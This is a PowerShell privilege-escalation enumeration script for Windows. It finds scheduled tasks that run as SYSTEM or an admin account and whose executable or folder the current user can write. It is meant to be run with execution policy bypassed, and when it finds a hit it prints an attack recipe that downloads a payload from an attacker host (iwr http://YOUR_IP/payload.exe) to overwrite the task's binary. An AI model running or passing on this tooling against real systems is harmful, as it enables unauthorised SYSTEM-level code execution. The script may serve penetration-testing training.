<#
    Find-WritableScheduledTask-RDP.ps1
    ----------------------------------
    For INTERACTIVE logons (RDP / console), where the ScheduledTasks cmdlets work.

    Finds SCHEDULED TASK privilege-escalation opportunities (replace-the-binary).

    For every task it answers the three questions from the material:
      1. WHO does it run as?      (Principal / Run As User)
      2. WILL it still trigger?   (State + Next Run Time)
      3. WHAT does it execute?    (the action's program / script + arguments)
    Then it tests whether YOUR account can replace that executable or script
    (write the file, or write its folder). A writable action that runs as
    SYSTEM or another (admin) user is a privilege-escalation path: swap the
    binary, let the trigger fire, and your code runs as that principal.

    Read-only. Does not modify, enable, disable, or run any task.
    Run:  powershell -ep bypass -File .\Find-WritableScheduledTask-RDP.ps1
#>

# --- who am I (my SID + every group SID I belong to) ---
$me      = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$mySids  = @($me.User.Value) + @($me.Groups | ForEach-Object { $_.Value })
$meShort = ($me.Name -split '\\')[-1]

# --- rights that let me replace a file or drop one into a folder ---
$writeFlagsInt = [int][System.Security.AccessControl.FileSystemRights]'CreateFiles,AppendData,WriteData,Write,Modify,FullControl,TakeOwnership,ChangePermissions'

function Test-IWrite($path) {
    if (-not $path -or -not (Test-Path -LiteralPath $path -ErrorAction SilentlyContinue)) { return $false }
    try { $acl = Get-Acl -LiteralPath $path -ErrorAction Stop } catch { return $false }
    foreach ($ace in $acl.Access) {
        if ($ace.AccessControlType -ne 'Allow') { continue }
        try { $sid = $ace.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]).Value }
        catch { $sid = $ace.IdentityReference.Value }
        if ($mySids -notcontains $sid) { continue }
        if ((([int]$ace.FileSystemRights) -band $writeFlagsInt) -ne 0) { return $true }
    }
    return $false
}

# Pull candidate file paths (exe/script) out of one action.
function Get-ActionTargets($execute, $arguments, $workDir) {
    $targets = @()
    $wd = ''
    if ($workDir) { $wd = [System.Environment]::ExpandEnvironmentVariables([string]$workDir) }

    if ($execute) {
        $e = [System.Environment]::ExpandEnvironmentVariables([string]$execute).Trim().Trim('"')
        if ($e) {
            if (-not [System.IO.Path]::IsPathRooted($e) -and $wd) { $e = Join-Path $wd $e }
            $targets += $e
        }
    }
    if ($arguments) {
        $a = [System.Environment]::ExpandEnvironmentVariables([string]$arguments)
        foreach ($tok in ($a -split '\s+')) {
            $t = $tok.Trim().Trim('"')
            if ($t -match '\.(exe|dll|ps1|bat|cmd|vbs|js)$') {
                if (-not [System.IO.Path]::IsPathRooted($t) -and $wd) { $t = Join-Path $wd $t }
                $targets += $t
            }
        }
    }
    return ($targets | Select-Object -Unique)
}

function Principal-Note($userId) {
    if (-not $userId) { return 'unknown principal' }
    $u = [string]$userId
    if ($u -match '(?i)system|administrator|admin') { return 'HIGH-VALUE (SYSTEM / admin)' }
    $short = ($u -split '\\')[-1]
    if ($short -ieq $meShort) { return 'runs as YOU - no elevation' }
    return 'runs as another principal - possible elevation'
}

Write-Host "`n[*] Running as: $($me.Name)" -ForegroundColor Cyan
Write-Host "[*] Hunting writable scheduled-task actions (RDP / interactive mode)...`n" -ForegroundColor Cyan

$tasks = Get-ScheduledTask -ErrorAction SilentlyContinue
if (-not $tasks) {
    Write-Host "[!] Get-ScheduledTask returned nothing. On WinRM/bind shell use the -WinRM script.`n" -ForegroundColor Red
    return
}

$found = $false
foreach ($t in $tasks) {
    $principal = $null
    try { $principal = $t.Principal.UserId } catch {}
    if (-not $principal) { try { $principal = $t.Principal.GroupId } catch {} }

    $targets = @()
    foreach ($act in @($t.Actions)) {
        $exe = $null; $argStr = $null; $wd = $null
        try { $exe    = $act.Execute } catch {}
        try { $argStr = $act.Arguments } catch {}
        try { $wd     = $act.WorkingDirectory } catch {}
        if ($exe) { $targets += (Get-ActionTargets $exe $argStr $wd) }
    }
    $targets = @($targets | Select-Object -Unique)
    if ($targets.Count -eq 0) { continue }       # COM-handler / no file action

    $writable = @()
    foreach ($tg in $targets) {
        $fileW = Test-IWrite $tg
        $dir   = Split-Path -Parent $tg -ErrorAction SilentlyContinue
        $dirW  = Test-IWrite $dir
        if ($fileW -or $dirW) {
            $writable += [PSCustomObject]@{ Target = $tg; FileWritable = $fileW; FolderWritable = $dirW }
        }
    }
    if ($writable.Count -eq 0) { continue }       # nothing we can replace

    $next = 'N/A'
    try {
        $info = Get-ScheduledTaskInfo -TaskName $t.TaskName -TaskPath $t.TaskPath -ErrorAction SilentlyContinue
        if ($info -and $info.NextRunTime) { $next = $info.NextRunTime }
    } catch {}

    $note  = Principal-Note $principal
    $color = if ($note -like 'runs as YOU*') { 'DarkGray' } else { 'Green' }

    $found = $true
    Write-Host ("[+] {0}{1}" -f $t.TaskPath, $t.TaskName) -ForegroundColor $color
    Write-Host ("      RunAs    : {0}   [{1}]" -f $principal, $note)
    Write-Host ("      State    : {0}   NextRun: {1}" -f $t.State, $next)
    foreach ($w in $writable) {
        $how = if ($w.FileWritable) { 'file writable' } else { 'folder writable' }
        Write-Host ("      [REPLACE] {0}   ({1})" -f $w.Target, $how) -ForegroundColor Yellow
    }
    Write-Host ""
}

if (-not $found) {
    Write-Host "[-] No scheduled task with a writable action binary/script found.`n" -ForegroundColor Yellow
} else {
    Write-Host "[*] Attack recipe for a green hit that still triggers:" -ForegroundColor Cyan
    Write-Host "      1. copy  C:\path\action.exe  C:\path\action.exe.bak   (keep the original)"
    Write-Host "      2. iwr http://YOUR_IP/payload.exe -OutFile C:\path\action.exe"
    Write-Host "      3. wait for Next Run Time (or the recurring trigger) to fire."
    Write-Host "      4. your payload runs as the RunAs principal; restore the .bak afterwards."
    Write-Host ""
}
